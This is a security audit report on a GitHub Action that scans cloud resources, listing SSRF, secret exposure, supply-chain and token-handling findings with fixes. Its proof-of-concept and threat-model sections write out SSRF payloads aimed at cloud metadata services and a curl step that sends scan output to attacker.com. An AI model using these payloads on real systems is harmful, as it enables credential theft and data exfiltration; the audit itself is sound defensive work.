# Security Audit - LeftSize GitHub Action

**Date**: 2025-10-31
**Auditor**: Security Review
**Scope**: Complete GitHub Action codebase and architecture

## Executive Summary

**CRITICAL FINDINGS**: 2
**HIGH FINDINGS**: 3
**MEDIUM FINDINGS**: 4
**LOW FINDINGS**: 2

**Overall Risk Level**: HIGH ⚠️

---

## CRITICAL VULNERABILITIES

### 🔴 CRITICAL-1: Arbitrary Command Execution via Cloud Custodian Policies

**Severity**: CRITICAL (CVSS 9.8)
**Component**: `run.py` - Policy execution mechanism

**Issue**:
The action executes Cloud Custodian policies using `subprocess.run()` with shell commands. While policies are bundled in the Docker image, Cloud Custodian itself can execute arbitrary Python code through policy definitions.

**Attack Vector**:
```python
# In execute_custodian_policies():
subprocess.run(
    ['custodian', 'run', '--output-dir', output_dir, policy_file],
    capture_output=True, text=True, check=True, timeout=timeout
)
```

**Risk**:
- Cloud Custodian policies support Python expressions in filters
- Malicious policy could execute arbitrary code
- Even bundled policies need security review

**Evidence in Code** (run.py line ~450-470):
```python
def execute_custodian_policies(policies_dir: str, config: Dict[str, Any]) -> Optional[List[Dict[str, Any]]]:
    # Executes custodian with policies from filesystem
    # No validation of policy content
```

**Remediation**:
1. Validate ALL policy files against a strict schema
2. Disable Python expression evaluation in Cloud Custodian (if possible)
3. Run Cloud Custodian in sandboxed container with restricted capabilities
4. Sign policy files and verify signatures before execution
5. Implement policy allowlist with hash verification

---

### 🔴 CRITICAL-2: Unvalidated Backend URL - SSRF Risk

**Severity**: CRITICAL (CVSS 9.1)
**Component**: `action.yml`, `run.py` - Backend submission

**Issue**:
The `backend-url` input is user-controlled and used directly in HTTP requests without validation.

**Attack Vector**:
```yaml
- uses: leftsize/leftsize-action@v1
  with:
    backend-url: http://169.254.169.254/latest/meta-data/  # AWS metadata service
    installation-id: "123"
    repository-token: "abc"
```

**Risk**:
- SSRF (Server-Side Request Forgery)
- Access to cloud metadata services (AWS, Azure, GCP)
- Internal network scanning
- Credential theft from metadata APIs
- Data exfiltration

**Evidence in Code** (run.py line ~715):
```python
def submit_findings(findings: List[Dict[str, Any]], config: Dict[str, Any]) -> None:
    backend_url = output_config.get('backend_url')  # No validation!
    url = f"{backend_url}/findings/{installation_id}/{repository_token}"
    response = requests.post(url, json=finding_groups, headers=headers, timeout=30)
```

**Proof of Concept**:
```yaml
backend-url: http://metadata.google.internal/computeMetadata/v1/
backend-url: http://169.254.169.254/latest/user-data
backend-url: file:///etc/passwd
backend-url: http://internal-admin-panel.local/
```

**Remediation**:
1. **HARDCODE** the backend URL - do NOT accept user input
2. If flexibility needed, use allowlist of approved domains
3. Validate URL scheme (only https://)
4. Block private IP ranges (RFC1918, link-local, loopback)
5. Implement URL parser validation
6. Add timeout and retry limits

**Recommended Fix**:
```python
ALLOWED_BACKEND_URLS = [
    'https://api.leftsize.io',
    'https://api-staging.leftsize.io'
]

def validate_backend_url(url: str) -> str:
    if url not in ALLOWED_BACKEND_URLS:
        raise ValueError(f"Invalid backend URL. Must be one of: {ALLOWED_BACKEND_URLS}")
    return url
```

---

## HIGH VULNERABILITIES

### 🟠 HIGH-1: Secret Exposure in GitHub Actions Outputs

**Severity**: HIGH (CVSS 7.5)
**Component**: `run.py` - GitHub Actions outputs

**Issue**:
The action exports findings as JSON in `findings-json` output. This data is visible in GitHub Actions logs and could contain sensitive information.

**Attack Vector**:
```python
# run.py line ~142
set_github_output('findings-json', json.dumps(findings, default=str))
```

**Risk**:
- Metadata might contain sensitive resource information
- Resource IDs expose infrastructure details
- Scope information reveals subscription/account structure
- Public repositories expose this data to everyone
- Fork workflows could exfiltrate data

**Evidence**:
- `findings-json` output contains complete resource metadata
- GitHub Actions logs are stored and searchable
- Forked repositories can modify workflows to exfiltrate outputs

**Remediation**:
1. Filter sensitive fields from metadata before output
2. Truncate resource IDs to minimize exposure
3. Add warning in documentation about sensitive data
4. Consider encrypting the output
5. Recommend private repositories only

---

### 🟠 HIGH-2: No Rate Limiting on Backend Submission

**Severity**: HIGH (CVSS 7.2)
**Component**: `run.py` - Backend submission

**Issue**:
No rate limiting or throttling when submitting findings to backend. Could be used for DDoS attacks.

**Attack Vector**:
```yaml
# Malicious workflow
jobs:
  spam:
    strategy:
      matrix:
        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
    runs-on: ubuntu-latest
    steps:
      - uses: leftsize/leftsize-action@v1
        with:
          installation-id: "victim-id"
          repository-token: "valid-token"
```

**Risk**:
- Backend API DDoS
- Resource exhaustion
- Legitimate users blocked
- Cost implications (if backend is metered)

**Remediation**:
1. Implement rate limiting in action (max 1 request per minute)
2. Add jitter and exponential backoff for retries
3. Backend should implement rate limiting per installation-id
4. Add maximum findings count limit

---

### 🟠 HIGH-3: Dependency Confusion Attack

**Severity**: HIGH (CVSS 7.0)
**Component**: `requirements.txt`, `Dockerfile`

**Issue**:
Python packages are installed from PyPI without hash verification or version pinning with hashes.

**Attack Vector**:
```dockerfile
# Dockerfile line ~25
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
```

**Risk**:
- Malicious package versions could be installed
- Supply chain attack via compromised packages
- Typosquatting attacks (e.g., `c7n-azrue` instead of `c7n-azure`)

**Evidence**:
```txt
# requirements.txt
c7n>=0.9.40  # No hash pinning!
c7n-azure>=0.7.40
azure-identity>=1.19.0
```

**Remediation**:
1. Pin ALL dependencies with exact versions and hashes
2. Use `pip-compile` with `--generate-hashes`
3. Regularly audit dependencies with `pip-audit`
4. Use a private PyPI mirror or artifact registry
5. Implement Dependabot for automated security updates

**Recommended**:
```txt
c7n==0.9.40 \
    --hash=sha256:abc123...
c7n-azure==0.7.40 \
    --hash=sha256:def456...
```

---

## MEDIUM VULNERABILITIES

### 🟡 MEDIUM-1: Repository Token Transmitted in URL Path

**Severity**: MEDIUM (CVSS 6.5)
**Component**: `run.py` - Backend submission

**Issue**:
Repository token is sent in URL path instead of headers, exposing it in:
- Web server access logs
- Proxy logs
- Browser history (if opened in browser)
- Referer headers

**Evidence**:
```python
# run.py line ~732
url = f"{backend_url}/findings/{installation_id}/{repository_token}"
response = requests.post(url, json=finding_groups, headers=headers, timeout=30)
```

**Risk**:
- Token exposure in logs
- Easier to intercept in transit
- Log aggregation systems may store tokens

**Remediation**:
```python
# Send token in Authorization header
headers = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {repository_token}',
    'X-LeftSize-Installation-Id': str(installation_id)
}
url = f"{backend_url}/findings"
response = requests.post(url, json=finding_groups, headers=headers)
```

---

### 🟡 MEDIUM-2: Insufficient Input Validation

**Severity**: MEDIUM (CVSS 6.0)
**Component**: Multiple - Action inputs

**Issue**:
User inputs are not properly validated for type, length, or format.

**Attack Vectors**:
```yaml
# Extremely long values
azure-subscription-ids: "sub-1,sub-2,...[100,000 subscriptions]"

# Injection attempts
exclude-policies: "'; DROP TABLE findings; --"

# Path traversal
custom-policies: "../../../etc/passwd"  # Already removed, but shows pattern
```

**Risk**:
- Resource exhaustion
- Unexpected behavior
- Potential injection attacks

**Remediation**:
1. Validate all inputs with strict regex patterns
2. Limit string lengths (e.g., max 1000 chars)
3. Validate GUID format for installation-id and repository-token
4. Validate subscription ID format (Azure GUID pattern)
5. Validate policy names against allowlist

---

### 🟡 MEDIUM-3: Timing Attack on Token Validation

**Severity**: MEDIUM (CVSS 5.5)
**Component**: Backend (not in action code, but architectural concern)

**Issue**:
String comparison for repository token likely uses standard comparison, vulnerable to timing attacks.

**Risk**:
- Attacker could discover valid tokens through timing analysis
- Requires many requests to be practical
- More dangerous if tokens are predictable

**Remediation** (Backend):
```csharp
// Use constant-time comparison
bool IsValidToken(string provided, string expected)
{
    return CryptographicOperations.FixedTimeEquals(
        Encoding.UTF8.GetBytes(provided),
        Encoding.UTF8.GetBytes(expected)
    );
}
```

---

### 🟡 MEDIUM-4: Docker Image Size and Attack Surface

**Severity**: MEDIUM (CVSS 5.0)
**Component**: `Dockerfile`

**Issue**:
Docker image includes full Azure CLI and AWS CLI, significantly increasing attack surface.

**Evidence**:
```dockerfile
# Install Azure CLI
RUN curl -sL https://aka.ms/InstallAzureCLIDeb | bash

# Install AWS CLI
RUN curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && \
    unzip awscliv2.zip && \
    ./aws/install
```

**Risk**:
- Large image size (~500MB estimate)
- More dependencies = more CVEs
- Increased build time
- More code to audit

**Remediation**:
1. Use multi-stage build to minimize final image
2. Consider minimal CLI implementations or SDK-only
3. Remove unnecessary tools
4. Use distroless or Alpine base image
5. Regular security scans with Trivy/Grype

---

## LOW VULNERABILITIES

### 🔵 LOW-1: Verbose Logging May Expose Sensitive Data

**Severity**: LOW (CVSS 3.5)
**Component**: `run.py` - Logging

**Issue**:
Verbose mode logs extensive information that may include sensitive resource details.

**Risk**:
- Resource metadata in logs
- Configuration details exposed
- Credentials potentially logged by dependencies

**Remediation**:
1. Add log sanitization
2. Redact sensitive fields
3. Document what verbose mode logs
4. Add security warning for verbose mode

---

### 🔵 LOW-2: No Integrity Verification for Policy Files

**Severity**: LOW (CVSS 3.0)
**Component**: `policies/` directory

**Issue**:
Policy files in Docker image are not checksummed or signed.

**Risk**:
- If image is compromised, policies could be modified
- No detection of tampering
- Difficult to verify policy authenticity

**Remediation**:
1. Generate checksums for all policy files
2. Verify checksums on startup
3. Sign policies and verify signatures
4. Document policy review process

---

## ARCHITECTURAL CONCERNS

### 🔍 AC-1: Trust Boundary Issues

**Architecture**: The action runs on user's infrastructure but submits to LeftSize backend.

**Concerns**:
1. User controls the runner (could modify action code)
2. User could intercept and modify findings before submission
3. No way to verify findings authenticity
4. No protection against replay attacks

**Recommendations**:
- Implement request signing (HMAC or JWT)
- Add timestamps and nonces to prevent replay
- Consider backend-initiated pull model instead
- Use GitHub's attestation API for provenance

---

### 🔍 AC-2: Multi-Tenancy Security

**Architecture**: Repository tokens provide tenant isolation.

**Concerns**:
1. Token generation process not visible (backend code)
2. No token rotation mechanism documented
3. No token revocation process
4. Tokens appear to be long-lived GUIDs

**Recommendations**:
- Implement automatic token rotation (e.g., monthly)
- Add manual token revocation in UI
- Consider short-lived tokens (1-hour JWTs)
- Add token usage monitoring and alerting
- Implement token scoping (read/write/scan permissions)

---

### 🔍 AC-3: Credential Exposure via OIDC

**Architecture**: Action uses OIDC tokens for cloud authentication.

**Concerns**:
1. OIDC token has broad permissions (Reader + Monitoring Reader)
2. Token valid for entire workflow duration
3. No least-privilege implementation
4. Could access other subscriptions if misconfigured

**Recommendations**:
- Document principle of least privilege
- Recommend separate service principals per environment
- Implement token time-boxing
- Add audit logging for all API calls

---

## THREAT MODEL

### Threat Actors

1. **Malicious Fork Attacker**
   - Forks user's repo
   - Modifies workflow to exfiltrate findings
   - Uses `findings-json` output to steal infrastructure data

2. **Compromised Repository**
   - Attacker gains repo access
   - Modifies workflow to change backend-url
   - Redirects findings to attacker-controlled server

3. **Supply Chain Attacker**
   - Compromises PyPI package
   - Malicious code in Cloud Custodian or dependencies
   - Executes in user's GitHub Actions environment

4. **Insider Threat**
   - Malicious LeftSize employee
   - Access to backend and user data
   - Could manipulate findings or steal credentials

### Attack Scenarios

**Scenario 1: Data Exfiltration**
```yaml
# In forked repo
- uses: leftsize/leftsize-action@v1
  id: scan
  with:
    installation-id: ${{ secrets.LEFTSIZE_INSTALLATION_ID }}
    repository-token: ${{ secrets.LEFTSIZE_REPOSITORY_TOKEN }}

- name: Exfiltrate
  run: |
    curl -X POST https://attacker.com/steal \
      -d "${{ steps.scan.outputs.findings-json }}"
```

**Scenario 2: SSRF + Metadata Theft**
```yaml
- uses: leftsize/leftsize-action@v1
  with:
    installation-id: "fake"
    repository-token: "fake"
    backend-url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Scenario 3: Backend Impersonation**
```yaml
- uses: leftsize/leftsize-action@v1
  with:
    installation-id: ${{ secrets.LEFTSIZE_INSTALLATION_ID }}
    repository-token: ${{ secrets.LEFTSIZE_REPOSITORY_TOKEN }}
    backend-url: https://evil-leftsize-phishing.com
    # Attacker steals installation-id and repository-token
```

---

## COMPLIANCE CONCERNS

### GDPR
- Findings may contain personal data (resource names, metadata)
- No data retention policy visible
- No user consent mechanism
- No data deletion process

### SOC 2
- Insufficient logging and monitoring
- No encryption at rest mentioned
- Access controls unclear
- Incident response process not documented

### PCI-DSS (if applicable)
- Findings might expose payment infrastructure
- No data masking for sensitive fields
- No network segmentation

---

## RECOMMENDATIONS (Prioritized)

### Immediate (Before Public Release)

1. **HARDCODE backend-url** - Remove user input completely
2. **Validate all inputs** - Add strict validation functions
3. **Pin dependencies with hashes** - Prevent supply chain attacks
4. **Move tokens to headers** - Don't send in URL path
5. **Add rate limiting** - Prevent abuse
6. **Filter sensitive data from outputs** - Redact before exposing

### Short-term (Within 1 month)

7. Implement policy integrity verification
8. Add request signing for backend communication
9. Implement token rotation mechanism
10. Add security documentation (SECURITY.md)
11. Set up dependency scanning (Dependabot, Renovate)
12. Implement log sanitization

### Long-term (Within 3 months)

13. Full security audit by third-party
14. Penetration testing
15. Bug bounty program
16. SOC 2 compliance if needed
17. Regular security reviews
18. Implement SIEM integration

---

## CONCLUSION

The LeftSize GitHub Action has **significant security vulnerabilities** that must be addressed before public release. The CRITICAL findings (arbitrary command execution risk and SSRF) are particularly concerning and could lead to:

- **Data breaches**
- **Credential theft**
- **Infrastructure compromise**
- **Reputational damage**

**RECOMMENDATION**: Do NOT publish to public repository until CRITICAL and HIGH findings are remediated.

---

## APPENDIX: Security Checklist

- [ ] Backend URL is hardcoded or strictly validated
- [ ] All dependencies pinned with cryptographic hashes
- [ ] Input validation implemented for all user inputs
- [ ] Secrets never logged or exposed in outputs
- [ ] Repository token sent in headers, not URL
- [ ] Rate limiting implemented
- [ ] Policy files integrity verified
- [ ] Docker image minimized and scanned
- [ ] Security documentation written (SECURITY.md)
- [ ] Incident response plan documented
- [ ] Security contact email published
- [ ] Regular security scanning automated
- [ ] Third-party security audit completed
- [ ] Penetration testing performed

**Audit Status**: ⚠️ NOT READY FOR PUBLIC RELEASE

**Next Review**: After remediation of CRITICAL findings
